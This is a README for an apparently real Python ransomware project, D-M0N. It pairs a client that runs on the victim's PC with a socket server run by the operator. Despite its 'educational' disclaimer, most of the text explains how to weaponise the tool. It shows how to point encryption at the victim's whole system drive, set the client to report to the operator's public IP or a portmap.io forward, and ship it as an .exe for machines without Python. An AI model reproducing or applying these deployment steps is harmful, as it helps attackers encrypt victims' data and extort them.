# D-M0N RANSOMWARE - EXPERIMENTAL PYTHON RANSOMWARE

**D-M0N is a compact testing Python ransomware for educational purposes only. Make sure you ONLY use it for vulnerabily testing or other needs.**

## Make it work properly
To use this ransomware, you must have:
  - a socket server running on any machine using ```server.py```
  - the malware on the 'victim's' PC which is the file ```client.py``` (or a **.exe** version so it can be ran without Python installed)

The current ransomware file is safe in case of an unintentional launching on your computer. It will only encrypt a test directory that I use to test it on my PC.

Please follow these steps to make it runnable and install it on a PC:

**1.** If you are sure, you can change ```server.py``` and ```client.py``` files so the program can run correctly and get all the files encrypted by:
  - ```client.py```: changing the ENCRYPTION_DIR constant to any functionnal directory like 'C:' or os.getenv("SystemDrive") to get main harddisk directory, example:
    ```python
    ENCRYPTION_DIR = os.getenv("SystemDrive")
    ```
- ```client.py```: changing the SERVER_ADDRESS constant (localhost on port 33800 by default) to YOUR server IP address (host, port), example:
  ```python
  SERVER_ADDRESS = ('228.35.112.75', 5555)
  ```
- ```server.py```: changing the SERVER_ADDRESS constant second value (port) to the same port you used on the client file, example:
  ```python
  SERVER_ADDRESS = ("0.0.0.0", 33800)
  ```

  **You can also use alternative port forwarding solutions like [portmap.io](https://portmap.io) instead of typing your real public IP address.**
